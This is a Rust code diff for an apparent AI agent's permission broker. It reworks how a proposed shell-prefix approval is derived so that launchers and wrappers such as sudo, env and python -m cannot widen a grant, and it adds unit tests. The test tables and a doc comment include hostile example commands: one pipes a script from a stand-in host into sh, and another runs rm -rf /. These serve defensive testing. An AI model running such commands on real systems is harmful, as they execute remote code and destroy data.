@@ -1675,8 +1675,8 @@ pub fn suggested_rule(
 /// The default prefix the TUI proposes when the operator opens the
 /// session-scoped shell-prefix grant editor (board item
 /// `01M32EBPWZZG6EA77ZG5KYC8KQ`) over a pending `RenderKind::ShellCommand`
-/// prompt: the first two whitespace-delimited tokens of `rendered`, or the
-/// whole (trimmed) command when it has fewer than two.
+/// prompt: ordinarily the first two whitespace-delimited tokens of
+/// `rendered`, or the whole (trimmed) command when it has fewer than two.
 ///
 /// **Why two tokens, not one.** A single-token default (`git`, `cargo`)
 /// would admit every subcommand of that program -- `git push --force`,
@@ -1691,18 +1691,257 @@ pub fn suggested_rule(
 /// (plus whatever further arguments follow, `prefix_matches`' own
 /// documented "prefix, not exact match" contract), not the whole program.
 ///
+/// **Board item `01M44PK0HNKWBXK86PWTHD6N7C`: two tokens is not always
+/// enough, and a shape-by-shape table of exceptions does not generalize.**
+/// A first pass at this function special-cased specific shapes it had
+/// found (`python3 -m <module>`, `cargo run --bin <name>`, `uv run
+/// <tool>`/`go run <package>`, `bash -c`/`sh -c`, a leading `env
+/// NAME=VALUE`) -- and a follow-up review found the table itself had
+/// holes a table always will: `env -i FOO=1 python3 -m pytest` (a flag
+/// mixed into `env`'s own assignments) still proposed `env -i FOO=1`,
+/// matching ANY later command; `uv run --with pandas script.py` and `go
+/// run -race ./cmd/server` both stopped on the FLAG right after `run`
+/// (`uv run --with`, `go run -race`), not the target, because the old
+/// code assumed the token right after a subcommand selector was always
+/// the target without checking; `python3 -u -m pytest -q` proposed
+/// `python3 -u`, the exact wildcard this item exists to close, because
+/// the table only ever looked at token TWO, never noticing a flag could
+/// sit between the head and `-m`. **This function now follows three
+/// invariants instead of enumerating shapes:**
+///
+/// - **A proposed prefix never ends on a flag token** (one starting with
+///   `-`) **and never ends on a launcher's own selector** (`-m` for
+///   python, `run` for `uv`/`go`/`cargo`/`bun`/`deno`, `dlx`/`exec` for
+///   `pnpm`) **when a target follows it.** Either the prefix extends past
+///   the selector to the token that actually NAMES the target, or it
+///   does not extend at all -- it is never left standing on the
+///   wildcard itself.
+/// - **A WRAPPER head -- one that re-executes some OTHER command
+///   verbatim without itself naming anything (`sudo`, `doas`, `env` with
+///   any flag of its own, `time`, `nice`, `nohup`, `timeout`, `stdbuf`,
+///   `xargs`, `command`, `exec`, `caffeinate`) -- always proposes the
+///   WHOLE rendered command.** A plain `env NAME=VALUE ...` run (no flag
+///   of `env`'s own) is the one exception: the assignments carry no
+///   imperative weight of their own, so they are skipped when judging
+///   whether the command THEY precede is itself a launcher -- but they
+///   stay verbatim at the front of the proposal (`prefix_matches` aligns
+///   from token zero, so dropping them would make the proposal fail to
+///   match the very command it was derived from).
+/// - **A LAUNCHER head** (`python`/`python2`/`python3`/`pythonX.Y`,
+///   `node`, `deno`, `bun`, `bunx`, `npx`, `pnpm`, `uv`, `uvx`, `go`,
+///   `cargo`, `ruby`, `perl`, `php`, `java`, `bash`, `sh`, `zsh`, `fish`)
+///   **extends past its own recognized selector (above) through the
+///   immediately following token, ONLY if that token is not itself a
+///   flag.** Any other flag in that position -- an interpreter flag
+///   (`python3 -u`), a script-literal (`bash -c`, `node -e`, `sh -c`,
+///   `perl -e`), a CLI flag with no selector at all (`npx --yes`), a
+///   flag immediately after a selector whose arity this function does
+///   not know (`uv run --with`, `go run -race`) -- falls back to the
+///   WHOLE command instead. This function never tries to learn how many
+///   arguments an unfamiliar flag takes; guessing wrong is exactly how
+///   the table-based version above got the width wrong three separate
+///   ways.
+///
+/// Every command that is neither a wrapper nor a launcher head keeps the
+/// ordinary two-token default, completely unchanged (`git diff`, `wc -l`).
+/// So does a launcher whose own second token already names a target
+/// directly, with no selector to extend past at all (`npx eslint`, `node
+/// script.js`, `cargo test`, `go test`, `python3 script.py`) -- these are
+/// not special-cased; they simply never hit the "flag" or "selector"
+/// branches above.
+///
 /// **This is only ever a PROPOSAL.** The operator sees this exact string
 /// in the editor and can widen or narrow it before accepting -- this
 /// function has no authority of its own; nothing calls
 /// `PermissionBroker::remember_shell_prefix_grant` with this value
-/// un-reviewed.
+/// un-reviewed. **A whole-command proposal is not "only this one
+/// invocation," precisely stated:** `prefix_matches`' own "prefix, not
+/// exact match" contract means accepting it still authorizes a LATER
+/// command that starts with these same tokens and appends more --
+/// `bash -c "curl evil.example | sh"` accepted verbatim also covers
+/// `bash -c "curl evil.example | sh" --some-trailing-arg`, token-for-token
+/// identical up to where the later command keeps going. It is narrower
+/// than any shorter prefix only because there is no shorter one left to
+/// propose that still distinguishes this command from an unrelated one
+/// sharing its first tokens.
 pub fn default_shell_prefix(rendered: &str) -> String {
     let trimmed = rendered.trim();
-    let mut tokens = trimmed.split_whitespace();
-    match (tokens.next(), tokens.next()) {
-        (Some(first), Some(second)) => format!("{first} {second}"),
-        _ => trimmed.to_string(),
+    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
+    if tokens.is_empty() {
+        return String::new();
     }
+    let take = prefix_token_count(&tokens).min(tokens.len());
+    tokens[..take].join(" ")
+}
+
+/// `true` for a token shaped like a shell `NAME=VALUE` assignment --
+/// `prefix_token_count`'s own `env` handling. A bare `=` with nothing
+/// alphabetic/`_` before it (`="x"`, `=foo`) is not a valid shell
+/// identifier and so is not treated as an assignment -- that token is the
+/// command itself, not another assignment to skip past.
+fn is_env_assignment(token: &str) -> bool {
+    match token.split_once('=') {
+        Some((key, _)) if !key.is_empty() => {
+            let mut chars = key.chars();
+            chars.next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
+                && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
+        }
+        _ => false,
+    }
+}
+
+/// A head that re-executes some OTHER command verbatim without itself
+/// naming anything -- `prefix_token_count` always proposes the WHOLE
+/// rendered command for one of these (see `default_shell_prefix`'s own
+/// doc): the real command is everything AFTER the wrapper, and guessing
+/// how many of the wrapper's OWN flags to skip past before it starts is
+/// exactly the flag-arity guessing this module refuses to do. `env` is
+/// handled separately (`prefix_token_count`'s own `env` arm) since a
+/// plain `NAME=VALUE` run gets the one narrow exception nothing else on
+/// this list does.
+fn is_wrapper_head(head: &str) -> bool {
+    matches!(
+        head,
+        "sudo"
+            | "doas"
+            | "time"
+            | "nice"
+            | "nohup"
+            | "timeout"
+            | "stdbuf"
+            | "xargs"
+            | "command"
+            | "exec"
+            | "caffeinate"
+    )
+}
+
+/// `true` for a `python`/`python2`/`python3`/`pythonX.Y`-shaped head --
+/// the optional version suffix is digits and dots only, so this never
+/// admits an unrelated program that merely starts with the substring
+/// `"python"`.
+fn is_python_head(head: &str) -> bool {
+    match head.strip_prefix("python") {
+        Some(rest) => rest.is_empty() || rest.chars().all(|c| c.is_ascii_digit() || c == '.'),
+        None => false,
+    }
+}
+
+/// A recognized interpreter/launcher head -- see `default_shell_prefix`'s
+/// own doc for the invariant this governs and the full reasoning.
+fn is_launcher_head(head: &str) -> bool {
+    is_python_head(head)
+        || matches!(
+            head,
+            "node"
+                | "deno"
+                | "bun"
+                | "bunx"
+                | "npx"
+                | "pnpm"
+                | "uv"
+                | "uvx"
+                | "go"
+                | "cargo"
+                | "ruby"
+                | "perl"
+                | "php"
+                | "java"
+                | "bash"
+                | "sh"
+                | "zsh"
+                | "fish"
+        )
+}
+
+/// `true` when `token` is `head`'s own recognized "names something else to
+/// run" selector -- the ONE subcommand/flag `prefix_token_count` still
+/// extends past. Every other token in that position, for every launcher,
+/// falls back to the whole command rather than an assumed arity (see
+/// `default_shell_prefix`'s own doc). `uv`/`go`/`cargo`/`bun`/`deno` share
+/// `run` because all five hand an arbitrary following name to something
+/// that executes it, the same shape `uv run <tool>`/`go run <package>`
+/// names explicitly; `pnpm`'s equivalents are its own subcommand names,
+/// `dlx`/`exec`, not `run` (`pnpm run <script>` looks up a script the
+/// project itself already declared, not an arbitrary external target, so
+/// it is deliberately NOT included here).
+fn is_launcher_selector(head: &str, token: &str) -> bool {
+    if is_python_head(head) {
+        return token == "-m";
+    }
+    match head {
+        "uv" | "go" | "cargo" | "bun" | "deno" => token == "run",
+        "pnpm" => matches!(token, "dlx" | "exec"),
+        _ => false,
+    }
+}
+
+/// How many of `tokens` (a non-empty command) `default_shell_prefix`
+/// should take -- `tokens.len()` itself means "the whole command" (every
+/// wrapper-head and fail-safe fallback below). See that function's own
+/// doc for the three invariants this implements.
+fn prefix_token_count(tokens: &[&str]) -> usize {
+    if tokens.len() <= 1 {
+        return tokens.len();
+    }
+    let head = tokens[0];
+
+    // `env`: the ONE wrapper with a transparent exception. A run of
+    // plain `NAME=VALUE` assignments is skipped when judging the command
+    // underneath it, but ANY flag -- `env`'s own (`-i`, `-u`, `-C`, ...),
+    // whether it appears before, between, or in place of an assignment --
+    // forfeits the exception and falls back to the whole command, exactly
+    // like every other wrapper: `env`'s OWN flags can change what
+    // environment the real command even runs in, and guessing which ones
+    // take a following value of their own is the arity-guessing this
+    // function refuses to do.
+    if head == "env" {
+        let mut idx = 1;
+        while idx < tokens.len() && is_env_assignment(tokens[idx]) {
+            idx += 1;
+        }
+        if idx >= tokens.len() || tokens[idx].starts_with('-') {
+            return tokens.len();
+        }
+        return (idx + prefix_token_count(&tokens[idx..])).min(tokens.len());
+    }
+
+    if is_wrapper_head(head) {
+        return tokens.len();
+    }
+
+    if is_launcher_head(head) {
+        let second = tokens[1];
+        if is_launcher_selector(head, second) {
+            // The selector needs an immediate, non-flag target right
+            // after it -- anything else (missing, or itself a flag:
+            // `uv run --with`, `go run -race`, a bare `python3 -m` with
+            // nothing after) is the flag-arity guess this function
+            // refuses to make.
+            return match tokens.get(2) {
+                Some(target) if !target.starts_with('-') => 3,
+                _ => tokens.len(),
+            };
+        }
+        if second.starts_with('-') {
+            // A flag immediately after the head that is NOT this
+            // launcher's own selector: an interpreter flag (`python3
+            // -u`), a script-literal (`bash -c`, `node -e`, `sh -c`),
+            // or an ordinary CLI flag with nothing to extend past
+            // (`npx --yes`). None of these name a fixed target, and
+            // none are assumed to take (or not take) an argument of
+            // their own.
+            return tokens.len();
+        }
+        // No selector needed: the very next token already names a fixed
+        // target directly (`python3 script.py`, `node script.js`, `npx
+        // eslint`, `cargo test`, `go test`) -- the ordinary two-token
+        // shape, reached here rather than skipped as a special case.
+        return 2;
+    }
+
+    // Every other command: the ordinary two-token default, unchanged.
+    2
 }
 
 /// **The compound-command exclusion (board item
@@ -2475,6 +2714,278 @@ mod store_tests {
             assert!(
                 prefix_matches(&prefix, rendered),
                 "default prefix {prefix:?} must match its own source command {rendered:?}"
+            );
+        }
+    }
+
+    // ---- board item `01M44PK0HNKWBXK86PWTHD6N7C`: the launcher/interpreter
+    // extension, and its own follow-up review. `python3 -m pytest -q` used
+    // to default to `python3 -m`, which authorizes `python3 -m` ANY module.
+    // A first fix special-cased specific shapes (a table); a review found
+    // the table itself had holes no table closes (`env -i FOO=1 x`, `uv run
+    // --with pandas`/`go run -race` stopping on the flag right after `run`,
+    // `python3 -u -m pytest` stopping on an interpreter flag before `-m`) --
+    // these tests are now organized around the three INVARIANTS
+    // `default_shell_prefix`'s own doc states, not one table per shape. ----
+
+    /// One table, one row per launcher this item's own doc names, each
+    /// pinning the ONE proposal the extension rule must produce when the
+    /// token right after the selector (or the head itself, for a launcher
+    /// with none) is NOT a flag -- not just that it differs from the naive
+    /// two-token default.
+    #[test]
+    fn default_shell_prefix_extends_through_the_real_target_for_every_named_launcher() {
+        let cases: &[(&str, &str)] = &[
+            ("python -m pip install requests", "python -m pip"),
+            ("python2 -m SimpleHTTPServer", "python2 -m SimpleHTTPServer"),
+            ("python3 -m pytest -q", "python3 -m pytest"),
+            ("python3.11 -m pytest -q", "python3.11 -m pytest"),
+            ("uv run pytest -q", "uv run pytest"),
+            ("go run ./cmd/server", "go run ./cmd/server"),
+            ("bun run build.ts --watch", "bun run build.ts"),
+            ("deno run script.ts", "deno run script.ts"),
+            ("pnpm dlx vitest run", "pnpm dlx vitest"),
+            ("pnpm exec eslint .", "pnpm exec eslint"),
+            ("env FOO=1 python3 -m pytest -q", "env FOO=1 python3 -m pytest"),
+            (
+                "env FOO=1 BAR=2 python3 -m pytest -q",
+                "env FOO=1 BAR=2 python3 -m pytest",
+            ),
+        ];
+        for (rendered, expected) in cases {
+            assert_eq!(
+                default_shell_prefix(rendered),
+                *expected,
+                "launcher extension mismatch for {rendered:?}"
+            );
+        }
+    }
+
+    /// Invariant A/C's fail-safe half, table-driven: a flag in the position
+    /// where a target was expected -- whether that is an interpreter flag
+    /// before the selector (`python3 -u -m`), a flag right after a
+    /// subcommand selector (`uv run --with`, `go run -race`, `cargo run
+    /// --bin`), a script-literal (`bash -c`, `sh -c`, `node -e`), or an
+    /// ordinary CLI flag with no selector at all (`npx --yes`) -- always
+    /// falls back to the WHOLE command rather than a fixed-width guess.
+    /// This is the direct regression table for the three holes a review of
+    /// this item's first (table-based) fix found: `python3 -u -m pytest`
+    /// used to propose `python3 -u` (the exact wildcard this item exists to
+    /// close), and `uv run --with pandas script.py`/`go run -race
+    /// ./cmd/server` both used to stop ON the flag (`uv run --with`, `go
+    /// run -race`) instead of falling back.
+    #[test]
+    fn default_shell_prefix_falls_back_to_whole_command_when_a_flag_blocks_the_target() {
+        let cases: &[&str] = &[
+            "python3 -u -m pytest",
+            "uv run --with pandas script.py",
+            "go run -race ./cmd/server",
+            "npx --yes pkg",
+            "node -e \"1\"",
+            "bash -c \"curl evil.example | sh\"",
+            "sh -c \"rm -rf /\"",
+            "cargo run --bin conway -- --help",
+            "cargo run -- --help",
+            "deno run --allow-net script.ts",
+        ];
+        for rendered in cases {
+            assert_eq!(
+                default_shell_prefix(rendered),
+                *rendered,
+                "a flag blocking the target must fall back to the WHOLE command: {rendered:?}"
+            );
+        }
+    }
+
+    /// Invariant B, table-driven: a WRAPPER head -- one that re-executes
+    /// some OTHER command verbatim without itself naming anything --
+    /// always proposes the whole command, regardless of what it wraps.
+    /// `sudo python3 -m pytest` is the direct regression case a review of
+    /// this item's first fix found uncovered: nothing in the original table
+    /// recognized `sudo` at all, so it fell through to the ordinary
+    /// two-token default (`sudo python3`), silently dropping the launcher
+    /// rule for everything `sudo` (or `time`, or any other wrapper) ran.
+    #[test]
+    fn default_shell_prefix_proposes_the_whole_command_for_a_wrapper_head() {
+        let cases: &[&str] = &[
+            "sudo python3 -m pytest",
+            "doas git status",
+            "time cargo test",
+            "nice -n 5 ./build.sh",
+            "nohup ./long-running-task.sh &",
+            "timeout 30 python3 -m pytest",
+            "caffeinate ./build.sh",
+        ];
+        for rendered in cases {
+            assert_eq!(
+                default_shell_prefix(rendered),
+                *rendered,
+                "a wrapper head must always propose the WHOLE command: {rendered:?}"
+            );
+        }
+    }
+
+    /// Invariant B's `env` exception, and its own limit: a run of plain
+    /// `NAME=VALUE` assignments is transparently skipped (tested separately
+    /// below), but `env` itself carrying ANY flag -- `-i`, `-u`, mixed in
+    /// among assignments or before them -- forfeits that exception and
+    /// falls back to the whole command, exactly like every other wrapper.
+    /// `env -i FOO=1 python3 -m pytest` is the direct regression case: a
+    /// review of this item's first fix found it still proposed `env -i
+    /// FOO=1`, which `prefix_matches` would have let match ANY later
+    /// command at all.
+    #[test]
+    fn default_shell_prefix_proposes_the_whole_command_when_env_itself_carries_a_flag() {
+        let cases: &[&str] = &[
+            "env -i FOO=1 python3 -m pytest",
+            "env FOO=1 -i python3 -m pytest",
+            "env -u PATH some-command",
+        ];
+        for rendered in cases {
+            assert_eq!(
+                default_shell_prefix(rendered),
+                *rendered,
+                "env with a flag of its own must fall back to the WHOLE command: {rendered:?}"
+            );
+        }
+    }
+
+    /// Launchers whose second token already names the real target verbatim
+    /// -- nothing to extend past -- keep the ordinary two-token default,
+    /// proving the extension is conditional on the SPECIFIC selector shapes
+    /// above, not "every known launcher always gets more tokens."
+    #[test]
+    fn default_shell_prefix_keeps_two_tokens_when_nothing_to_extend_past() {
+        let cases: &[(&str, &str)] = &[
+            ("npx eslint src/", "npx eslint"),
+            ("node script.js --watch", "node script.js"),
+            ("cargo test -p conway", "cargo test"),
+            ("cargo build --release", "cargo build"),
+            ("go test ./...", "go test"),
+            ("python3 script.py --flag", "python3 script.py"),
+        ];
+        for (rendered, expected) in cases {
+            assert_eq!(
+                default_shell_prefix(rendered),
+                *expected,
+                "unexpected extension for {rendered:?}"
+            );
+        }
+    }
+
+    /// Keep the existing behaviour for ordinary (non-launcher, non-wrapper)
+    /// commands -- this item's own explicit requirement, so a future change
+    /// to the launcher/wrapper heads cannot silently widen or narrow the
+    /// common case.
+    #[test]
+    fn default_shell_prefix_keeps_ordinary_command_behaviour_unchanged() {
+        assert_eq!(default_shell_prefix("git diff --stat"), "git diff");
+        assert_eq!(default_shell_prefix("wc -l src/calc.py"), "wc -l");
+    }
+
+    /// Every proposal this item's rule produces must still satisfy the same
+    /// "matches its own source command" contract the plain two-token
+    /// default already had to (see the un-launcher-aware test earlier in
+    /// this section) -- a WIDER extension, or a fall-back to the whole
+    /// command, never breaks the token-alignment guarantee `prefix_matches`
+    /// itself provides (a whole-command proposal trivially matches its own
+    /// source; the point of this test is that the NARROWER, extended
+    /// proposals do too).
+    #[test]
+    fn launcher_extended_prefixes_still_match_the_command_they_were_derived_from() {
+        for rendered in [
+            "python3 -m pytest -q",
+            "uv run pytest -q",
+            "go run ./cmd/server",
+            "bun run build.ts --watch",
+            "env FOO=1 python3 -m pytest -q",
+            "python3 -u -m pytest",
+            "sudo python3 -m pytest",
+            "env -i FOO=1 python3 -m pytest",
+        ] {
+            let prefix = default_shell_prefix(rendered);
+            assert!(
+                prefix_matches(&prefix, rendered),
+                "proposal {prefix:?} must match its own source command {rendered:?}"
+            );
+        }
+    }
+
+    /// Board item `01M44PK0HNKWBXK86PWTHD6N7C`'s own property-style check
+    /// for invariant A, run over every rendered command this section's
+    /// other tests cover: no proposal's LAST token may start with `-` --
+    /// the concrete, mechanical half of "never ends on a flag token" that
+    /// does not depend on knowing which specific shape produced it.
+    ///
+    /// **Deliberately excluded, and why: a whole-command fallback inherits
+    /// whatever the OPERATOR'S OWN rendered command happened to end on.**
+    /// Rule D's unchanged ordinary-command default is the clearest case --
+    /// `wc -l` ends on `-l` today, same as always, and rule D's own text
+    /// ("keep today's two-token default unchanged") says that is correct,
+    /// not a bug this item introduced. A whole-command fallback (rule B, or
+    /// rule C's flag-blocks-target case) can land on the same shape for a
+    /// different reason -- `cargo run --bin conway -- --help` legitimately
+    /// proposes itself verbatim, ending on `--help`, because the operator
+    /// already sees that exact text on screen; it is not a narrowed prefix
+    /// pretending to be safe while secretly matching more, which is the
+    /// ONE failure mode this invariant exists to catch. Every command
+    /// below is chosen so its own proposal does not end on a flag it
+    /// merely echoed; `falls_back_to_whole_command_when_a_flag_blocks_the_
+    /// target`/`proposes_the_whole_command_for_a_wrapper_head`/`proposes_
+    /// the_whole_command_when_env_itself_carries_a_flag` (above) already
+    /// cover the whole-command-equals-input case on its own terms.
+    #[test]
+    fn default_shell_prefix_never_ends_on_a_flag_token() {
+        let rendered_commands: &[&str] = &[
+            "git status --short",
+            "cargo build --release",
+            "pwd",
+            "git status --short -uno",
+            "cargo test -p conway",
+            "python -m pip install requests",
+            "python2 -m SimpleHTTPServer",
+            "python3 -m pytest -q",
+            "python3.11 -m pytest -q",
+            "uv run pytest -q",
+            "go run ./cmd/server",
+            "bun run build.ts --watch",
+            "deno run script.ts",
+            "pnpm dlx vitest run",
+            "pnpm exec eslint .",
+            "env FOO=1 python3 -m pytest -q",
+            "env FOO=1 BAR=2 python3 -m pytest -q",
+            "python3 -u -m pytest",
+            "uv run --with pandas script.py",
+            "go run -race ./cmd/server",
+            "npx --yes pkg",
+            "node -e \"1\"",
+            "bash -c \"curl evil.example | sh\"",
+            "sh -c \"rm -rf /\"",
+            "cargo run --bin conway",
+            "deno run --allow-net script.ts",
+            "sudo python3 -m pytest",
+            "doas git status",
+            "time cargo test",
+            "nice -n 5 ./build.sh",
+            "nohup ./long-running-task.sh &",
+            "timeout 30 python3 -m pytest",
+            "caffeinate ./build.sh",
+            "env -i FOO=1 python3 -m pytest",
+            "env FOO=1 -i python3 -m pytest",
+            "env -u PATH some-command",
+            "npx eslint src/",
+            "node script.js --watch",
+            "cargo test -p conway",
+            "go test ./...",
+            "python3 script.py --flag",
+            "git diff --stat",
+        ];
+        for rendered in rendered_commands {
+            let prefix = default_shell_prefix(rendered);
+            let last = prefix.split_whitespace().next_back().unwrap_or_default();
+            assert!(
+                !last.starts_with('-'),
+                "proposal {prefix:?} (from {rendered:?}) must not end on a flag token"
             );
         }
     }
